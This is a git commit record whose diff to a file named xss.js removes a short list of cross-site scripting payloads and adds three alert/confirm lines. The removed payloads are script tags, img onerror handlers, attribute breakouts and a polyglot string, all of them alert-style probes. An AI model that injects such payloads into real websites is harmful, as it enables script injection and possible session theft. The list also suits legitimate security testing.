bad4d9b7b8b71dcab942455047b51b27f71b7133
IYBmad <city_a.m@live.fr>
2024-09-17 21:26:08 +0100

    xss.js

--- xss.js
+++ xss.js
@@ -1,8 +1,3 @@
-<script>alert('xss.js')</script>
-"'><img src=q onerror="alert('xss.js')">
-"/><img src=q onerror=oNloaD=confirm('xss.js')>
-]]>&lt;script&gt;alert('XSS js')&lt;/script&gt;
-&lt;script&gt;OnMouseover=prompt('document.cookie')&lt;/script&gt;
-&lt;img src=q onerror="alert('xss.js')"&gt;
-]]>&lt;noscript ondragover=alert('xss.js') contenteditable>drop here&lt;/noscript&gt;
-%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+alert('xss.js');
+alert('document.cookie');
+onload = function() { confirm('xss.js'); };
